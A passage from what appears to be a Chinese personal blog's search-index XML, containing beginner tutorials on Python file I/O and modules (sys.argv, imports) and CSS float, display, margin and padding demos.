<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"border-bottom"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"xieyi"</span>&gt;</span></span><br><span class="line">				免责声明及隐私权政策 浙ICP备09002987号-11 © 2021阿里巴巴集团 版权所有</span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【python】文件读写操作</title>
    <url>/posts/95.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. 打开文件</span></span><br><span class="line"><span class="string">2. 操作文件</span></span><br><span class="line"><span class="string">3. 关闭文件</span></span><br><span class="line"><span class="string">r #文件不存在则不可读（报错）</span></span><br><span class="line"><span class="string">w</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">f = open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>,encoding=<span class="string">'utf8'</span>)</span><br><span class="line"><span class="comment"># print(f.readable())  #判断文件是否可读</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f.read(14))  # 默认 读取全部 \n 换行符都只占一个字节</span></span><br><span class="line"><span class="comment"># print(f.read(14))  # 默认 读取全部 \n 换行符都只占一个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f.readline(),end='')</span></span><br><span class="line"><span class="comment"># print(f.readline(),end='')</span></span><br><span class="line"><span class="comment"># print(f.tell())</span></span><br><span class="line"><span class="comment"># print(f.readline(),end='')</span></span><br><span class="line"><span class="comment"># print(f.tell()) #汉字3个字节 字符1个字节 换行符2个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f.readlines()[3]) # 读取全部，返回的是列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f.readlines(19)) # 根据光标来确定数值</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">第二行添加hello world</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">res = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">   <span class="comment"># print(res[i])</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span> :</span><br><span class="line">        print(res[i].strip(),<span class="string">'hello world'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(res[i])</span><br></pre></td></tr></table></figure></div>

<h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">模式与方法要匹配</span></span><br><span class="line"><span class="string">w--》文件不存在 创建文件 </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># f = open('test1.txt' , 'w')</span></span><br><span class="line"><span class="comment"># # print(f.writable())  # bool</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # f.write('hello world') # 覆盖文件</span></span><br><span class="line"><span class="comment"># f.writelines(['hello world\n','hello world'])</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a 文件不存在时，创建文件 追加 append</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">f = open(<span class="string">'test2.txt'</span> , <span class="string">'a'</span>)</span><br><span class="line">f.write(<span class="string">'hello world \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">图片</span></span><br><span class="line"><span class="string">音频</span></span><br><span class="line"><span class="string">二进制</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">b = <span class="string">b'hello world'</span></span><br><span class="line"><span class="comment"># print(type(b)) #bytes</span></span><br><span class="line">f = open(<span class="string">'test.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line">f.write(b)  <span class="comment"># w 对文本只能写str</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">json.dumps() --&gt;语句</span></span><br><span class="line"><span class="string">json.dump() --&gt;文件</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># data  = &#123;"name":"amy"&#125;</span></span><br><span class="line"><span class="comment"># res  = json.dumps(data)</span></span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line"><span class="comment"># print(type(res))</span></span><br><span class="line"><span class="comment"># # print(type(data))</span></span><br><span class="line"><span class="comment"># f = open('test.json','w') #dict --&gt;&gt; '&#123;"name":"amy"&#125;'</span></span><br><span class="line"><span class="comment"># json.dump(data,f)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># f  = open('test.json','r')</span></span><br><span class="line"><span class="comment"># # print(type(f.read())) # '&#123;"data":&#123;"name":&#123;&#125;&#125;&#125;'</span></span><br><span class="line"><span class="comment"># d_data = json.load(f)</span></span><br><span class="line"><span class="comment"># print(d_data['name'])</span></span><br><span class="line"><span class="comment"># print(type(d_data))</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">f.close()--&gt;关闭文件</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># import time</span></span><br><span class="line"><span class="comment"># f = open('test6.txt','w')</span></span><br><span class="line"><span class="comment"># f.write("hello world")</span></span><br><span class="line"><span class="comment"># time.sleep(5) #程序执行完毕才写入</span></span><br><span class="line"><span class="comment"># f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment">#     f  = open('test6.txt','w')</span></span><br><span class="line"><span class="comment">#     f.read()</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment">#     print(e)</span></span><br><span class="line"><span class="comment"># finally:</span></span><br><span class="line"><span class="comment">#     if f:</span></span><br><span class="line"><span class="comment">#         f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">上下文管理器</span></span><br><span class="line"><span class="string">with 自动调用__enter__(), 将方法的返回值给as后面的变量</span></span><br><span class="line"><span class="string">相当于 f = open()</span></span><br><span class="line"><span class="string">with后面的代码块全部执行完毕之后，将调用前面返回对象__exit__() --&gt; f.close()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'test8.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">'hello world'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">唯一的区别是，with open（）自动关闭</span></span><br><span class="line"><span class="string">open（）需要自己f.close()</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>python</tag>
        <tag>文件读写</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之float浮动块级元素行内元素</title>
    <url>/posts/57.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CSS基础学习之float浮动块级元素行内元素"><a href="#CSS基础学习之float浮动块级元素行内元素" class="headerlink" title="CSS基础学习之float浮动块级元素行内元素"></a>CSS基础学习之float浮动块级元素行内元素</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210709114945420.png" alt="image-20210709114945420"></p>
<h2 id="demo8（margin设置代码）"><a href="#demo8（margin设置代码）" class="headerlink" title="demo8（margin设置代码）"></a>demo8（margin设置代码）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo8<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--float浮动 块级元素 行内元素--&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  		ul&#123;</span><br><span class="line">  			list-style: none;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="comment">/*浮动一般做导航*/</span></span></span><br><span class="line"><span class="css">  		<span class="selector-class">.nav-left</span>,<span class="selector-class">.nav-left</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">  			float: left;</span><br><span class="line">  			margin-left: 10px;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="selector-class">.nav-right</span>&#123;</span></span><br><span class="line">  			float: right;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="selector-class">.nav-right</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">  			float: left;</span><br><span class="line">  			margin-left: 10px;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="selector-tag">a</span>&#123;<span class="attribute">text-decoration</span>: none;&#125;</span></span><br><span class="line"><span class="css">  		<span class="comment">/*清楚浮动 clear*/</span></span></span><br><span class="line"></span><br><span class="line">  	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav-left"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>工具<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>更新<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav-right"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="demo9（行内元素和块级元素display）"><a href="#demo9（行内元素和块级元素display）" class="headerlink" title="demo9（行内元素和块级元素display）"></a>demo9（行内元素和块级元素display）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo9<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--float浮动 块级元素 行内元素--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    	<span class="selector-class">.demo9</span>,<span class="selector-class">.demo10</span>&#123;</span></span><br><span class="line">    		height: 100px;</span><br><span class="line">    		width: 100px;</span><br><span class="line">    		border: 1px solid red;</span><br><span class="line">    		display: inline;</span><br><span class="line">    	&#125;</span><br><span class="line">    	span&#123;</span><br><span class="line">    		border: 1px solid red;</span><br><span class="line">    		height: 100px;</span><br><span class="line">    		padding-left: 10px;</span><br><span class="line">    		display: inline-block;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo9"</span>&gt;</span></span><br><span class="line">		demo9</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo10"</span>&gt;</span></span><br><span class="line">		demo10</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--行内元素--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>超级链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之盒子模型margin和padding的使用</title>
    <url>/posts/56.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CSS基础学习四盒子模型margin和padding的使用"><a href="#CSS基础学习四盒子模型margin和padding的使用" class="headerlink" title="CSS基础学习四盒子模型margin和padding的使用"></a>CSS基础学习四盒子模型margin和padding的使用</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210709104702050.png" alt="image-20210709104702050"></p>
<h2 id="demo5（margin设置代码）"><a href="#demo5（margin设置代码）" class="headerlink" title="demo5（margin设置代码）"></a>demo5（margin设置代码）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo5<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--盒子模型、margin、padding学习--&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  	<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">  		margin-top: 20px;</span><br><span class="line">  		margin-left: 30px;</span><br><span class="line">  		margin-bottom: 50px;</span><br><span class="line">  		margin-right: 30px;  		</span><br><span class="line"><span class="css">  		<span class="comment">/*margin: 20px;*/</span>  </span></span><br><span class="line"><span class="css">  		<span class="comment">/*margin 外边距*/</span></span></span><br><span class="line">  	&#125;</span><br><span class="line"><span class="css">  	<span class="selector-class">.div1</span>,<span class="selector-class">.div2</span>,<span class="selector-class">.div3</span>&#123;</span></span><br><span class="line">  		width: 400px;</span><br><span class="line">  		height: 400px;</span><br><span class="line">  		background: red;</span><br><span class="line">  		border: 5px solid blue;</span><br><span class="line">  	&#125;</span><br><span class="line"><span class="css">  	<span class="selector-class">.div3</span>&#123;</span></span><br><span class="line"><span class="css">  		<span class="comment">/*margin: 10px 20px 30px 40px;*/</span> <span class="comment">/*上右下左*/</span></span></span><br><span class="line">  		margin: 0px auto;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div3"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="demo6（padding和margin差不多的设置代码）"><a href="#demo6（padding和margin差不多的设置代码）" class="headerlink" title="demo6（padding和margin差不多的设置代码）"></a>demo6（padding和margin差不多的设置代码）</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210709104832921.png" alt="image-20210709104832921"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo6<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--盒子模型、margin、padding学习--&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  		<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">  			width: 400px;</span><br><span class="line">  			height: 400px;</span><br><span class="line">  			background: red;</span><br><span class="line"><span class="css">  			<span class="comment">/*用法和margin差不多*/</span></span></span><br><span class="line">  			padding: 10px 20px 30px 40px;</span><br><span class="line">  		&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【python】模块基础</title>
    <url>/posts/96.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="模块的导入方法"><a href="#模块的导入方法" class="headerlink" title="模块的导入方法"></a>模块的导入方法</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">demo1.py&gt;&gt;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"demo1_test1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"demo1_test2"</span>)</span><br><span class="line"></span><br><span class="line">demo2.py&gt;&gt;</span><br><span class="line"><span class="comment"># import demo1</span></span><br><span class="line"><span class="comment"># demo1.test1()</span></span><br><span class="line"><span class="comment"># demo1.test2()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from demo1 import test1,test2</span></span><br><span class="line"><span class="comment"># test1()</span></span><br><span class="line"><span class="comment"># test2()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from demo1 import *</span></span><br><span class="line"><span class="comment"># test1()</span></span><br><span class="line"><span class="comment"># test2()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> demo1 <span class="keyword">import</span> test1 <span class="keyword">as</span> demo1_test1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"demo2_test1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"demo2_test2"</span>)</span><br><span class="line"></span><br><span class="line">test1()</span><br><span class="line">demo1_test1()</span><br></pre></td></tr></table></figure></div>

<h1 id="内置模块"><a href="#内置模块" class="headerlink" title="内置模块"></a>内置模块</h1><h2 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h2><p>sys.argv与外部对接模块</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#print(sys.argv[0]) # 程序本身路径</span></span><br><span class="line"><span class="comment">#与外部对接的传参作用</span></span><br><span class="line"></span><br><span class="line">res = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#print(res)</span></span><br><span class="line"><span class="keyword">if</span> res == <span class="string">'yes'</span>:</span><br><span class="line">    print(<span class="string">"i am ok"</span>)</span><br></pre></td></tr></table></figure></div>

<p>命令行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">C:\Users\<span class="number">23242</span>\AppData\Local\Temp\<span class="number">81.</span>py1&gt;python3 demo2.py yes</span><br><span class="line"></span><br><span class="line">i am ok</span><br></pre></td></tr></table></figure></div>

<p>其他sys的使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#print(sys.argv[0]) # 程序本身路径</span></span><br><span class="line"><span class="comment">#与外部对接的传参作用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># res = sys.argv[1]</span></span><br><span class="line"><span class="comment"># #print(res)</span></span><br><span class="line"><span class="comment"># if res == 'yes':</span></span><br><span class="line"><span class="comment">#     print("i am ok")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sys.version()&gt;&gt;解释器的版本信息</span></span><br><span class="line"><span class="comment">#print(sys.version)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#模块搜索路径</span></span><br><span class="line"><span class="comment">#print(sys.path)</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'111'</span>)</span><br><span class="line"><span class="comment">#断点</span></span><br><span class="line"><span class="comment">#sys.exit()</span></span><br><span class="line">print(<span class="string">'222'</span>)</span><br></pre></td></tr></table></figure></div>

